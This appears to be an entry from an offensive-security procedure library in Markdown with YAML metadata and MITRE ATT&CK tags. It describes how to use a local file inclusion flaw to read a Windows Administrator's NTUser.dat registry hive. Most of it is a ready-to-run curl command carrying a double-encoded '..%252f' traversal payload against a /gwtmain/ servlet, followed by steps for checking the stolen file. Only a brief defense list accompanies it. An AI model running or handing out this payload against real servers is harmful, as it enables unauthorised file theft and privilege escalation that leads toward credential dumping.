---
id: proc-uuid-3
tags:
  - path-traversal
  - lfi
  - privilege-escalation
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/curl-path-traversal-ntuser]]'
verified: false
platforms:
  - Web
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-14T17:29:19.933Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[File and Directory Discovery]]'
---
# Verify-Admin-Privileges-via-Restricted-File-Access

## Summary

This procedure tests the LFI vulnerability's privilege level by attempting to read a restricted administrator file, NTUser.dat, confirming execution under admin context on the Windows server.

## Description

NTUser.dat is a registry hive file accessible only by administrators, located at C:\Users\Administrator\NTUser.dat. Using the same double-encoded traversal in /gwtmain/, successful access proves the servlet runs with elevated privileges, enabling further attacks like credential dumping. This builds on prior POC and requires the target to be Windows-based.

## Requirements

1. Successful POC LFI from previous procedure
2. Target confirmed as Windows with admin user profiles
3. Ability to handle binary response data

## Defense

Defensive measures and detection strategies:

- Run web servlets under least-privilege accounts (e.g., non-admin)
- Restrict file system access for application pools
- Alert on attempts to access user profile directories or registry files

## Objectives

1. Confirm admin-level file access via LFI
2. Demonstrate potential for privilege-based escalation
3. Identify risks for sensitive data exposure

## Instructions

### Step 1: Send Traversal to Restricted File

**Context**: Target the admin user's NTUser.dat with the traversal payload to verify privileges.

**Command** ([[commands/curl-path-traversal-ntuser]]):
```bash
curl -X GET "https://target-domain/gwtmain//..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fUsers/Administrator/NTUser.dat" -H "Host: target-domain" -H "Accept-Encoding: gzip, deflate" -H "Accept: */*" -H "Accept-Language: en" -H "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)" --connect-timeout 10 -v --output ntuser.dat
```

> The --output saves the binary response. Expected output: 200 OK with NTUser.dat contents (binary data); analyze with tools like regedit for registry info.

### Step 2: Validate Privilege Confirmation

**Context**: Inspect the retrieved file to ensure it's the real admin hive.

No command; use hex editor or registry viewer on the output file.

> Success if file matches expected NTUser.dat structure, confirming admin access.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[File and Directory Discovery]] File and Directory Discovery

### Sub-Techniques

- None

## Commands Used

- [[commands/curl-path-traversal-ntuser]]

## Tools Used

- None specific

## Tags

- [[path-traversal]]
- [[lfi]]
- [[privilege-escalation]]
